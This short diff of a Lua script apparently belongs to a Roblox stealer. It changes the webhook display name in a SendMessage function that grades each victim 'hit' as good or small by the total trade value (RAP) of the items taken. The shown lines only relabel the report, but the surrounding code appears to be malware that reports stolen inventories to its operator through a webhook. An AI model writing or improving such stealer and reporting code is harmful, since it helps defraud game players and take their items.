@@ -166,7 +166,7 @@ end
 local function SendMessage(list)
     local isGoodHit = totalRAP >= 500
     local statusText = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT"
-    local webhookName = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)"
+    local webhookName = isGoodHit and "⚪ SERVER HIT🎯" or "⚪ SERVER HIT🎯"
     local embedColor = isGoodHit and 65280 or 8323327
 
     local fields = {
